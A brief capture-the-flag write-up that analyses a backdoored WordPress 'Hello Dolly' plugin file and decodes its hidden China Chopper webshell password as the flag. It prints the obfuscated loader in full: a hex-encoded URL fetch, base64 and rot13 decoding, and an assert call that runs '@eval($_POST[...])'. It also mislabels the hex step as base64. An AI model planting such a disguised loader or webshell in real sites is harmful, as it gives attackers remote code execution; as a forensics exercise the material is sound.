## Writeup

题目要求寻找菜刀密码

## hello.php

```
<?php
/**
 * @package Hello_Dolly
 * @version 1.6
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.6
Author URI: http://ma.tt/
*/
if(empty($_SESSION['cfg']))			$_SESSION['cfg']=file_get_contents(hex2bin('687474703a2f2f3132372e302e302e312f77702d636f6e74656e742f7468656d65732f7477656e74797369787465656e2f6a732f75692e6a73'));
$arr=array(str_rot13(base64_decode($_SESSION['cfg'])),);
array_filter($arr,str_rot13(base64_decode('bmZmcmVn')));

```

`687474703a2f2f3132372e302e302e312f77702d636f6e74656e742f7468656d65732f7477656e74797369787465656e2f6a732f75692e6a73` 

base64 decode

`http://127.0.0.1/wp-content/themes/twentysixteen/js/ui.js`

Content

`QHJpbnkoJF9DQkZHWyJvN3BxbnMwMzBxNTlzc3JxNzMxcXBuMDFuMTU2NXJybyJdKQ==`

base64 decode

` @riny($_CBFG["o7pqns030q59ssrq731qpn01n1565rro"]) `

decode rot13

```
>>> import codecs
>>> codecs.encode('@riny($_CBFG["o7pqns030q59ssrq731qpn01n1565rro"])', 'rot_13')
'@eval($_POST["b7cdaf030d59ffed731dca01a1565eeb"])'

```

`@eval($_POST["b7cdaf030d59ffed731dca01a1565eeb"])`

flag{b7cdaf030d59ffed731dca01a1565eeb}
